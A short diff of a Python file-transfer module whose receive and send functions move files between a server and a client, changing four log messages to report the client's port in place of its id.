@@ -7,7 +7,7 @@ from modules.clients import Client
 
 def receive(client: Client, filename: str, save_name: str) -> None:
     """ Receive a file from the client """
-    logging.debug('Receiving file "%s" from client (%s)', filename, client.id)
+    logging.debug('Receiving file "%s" from client (%s)', filename, client.port)
 
     client.write(b'SEND_FILE')
     client.write(filename.encode())
@@ -17,7 +17,7 @@ def receive(client: Client, filename: str, save_name: str) -> None:
             data = client.read()
             if data == b'ERROR':
                 error = client.read().decode()
-                logging.info('File "%s" transfer failed (%s): %s', filename, client.id, error)
+                logging.info('File "%s" transfer failed (%s): %s', filename, client.port, error)
                 raise RuntimeError(f'File transfer failed: {error}')
             if data == b'FILE_TRANSFER_DONE':
                 break
@@ -26,7 +26,7 @@ def receive(client: Client, filename: str, save_name: str) -> None:
 
 def send(client: Client, filename: str, save_name: str, blocksize: int = 32768) -> None:
     """ Send a file to client """
-    logging.debug('Sending file "%s" to client (%s)', filename, client.id)
+    logging.debug('Sending file "%s" to client (%s)', filename, client.port)
 
     # Check that the file exists and it's permissions before calling client
     if not os.path.isfile(filename):
@@ -49,5 +49,5 @@ def send(client: Client, filename: str, save_name: str, blocksize: int = 32768) 
                 break
             client.write(block)
 
-    logging.info('Successfully transferred file "%s" to client (%s)', filename, client.id)
+    logging.info('Successfully transferred file "%s" to client (%s)', filename, client.port)
     client.write(b'FILE_TRANSFER_DONE')
